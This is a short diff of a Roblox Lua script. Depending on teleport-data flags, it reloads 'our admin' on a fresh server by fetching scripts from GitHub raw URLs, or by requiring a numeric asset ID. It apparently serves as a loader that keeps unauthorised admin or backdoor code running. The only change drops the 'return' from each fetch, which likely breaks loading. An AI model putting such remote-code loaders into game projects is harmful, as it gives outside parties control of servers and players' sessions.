@@ -24,7 +24,7 @@ for i,v in pairs(game.Players:GetPlayers()) do
         else -- this part loads our admin back after the server is fresh
             if data.TeleportData.cxo then
                 local success, err = pcall(function()
-                    return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/admin")
+                    game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/admin")
                 end)
 
                 if success then
@@ -34,7 +34,7 @@ for i,v in pairs(game.Players:GetPlayers()) do
                 end
             elseif data.TeleportData.dizzy then
             local success, err = pcall(function()
-                return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/FMFAU/Random/refs/heads/main/DeLuaAdmin.lua")
+                game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/FMFAU/Random/refs/heads/main/DeLuaAdmin.lua")
             end)
 
             if success then
@@ -44,7 +44,7 @@ for i,v in pairs(game.Players:GetPlayers()) do
             end
             elseif data.TeleportData.punchy then
                 local success, err = pcall(function()
-                    return require(115513593459588).LoadPunchside()
+                    require(115513593459588).LoadPunchside()
                 end)
 
                 if success then
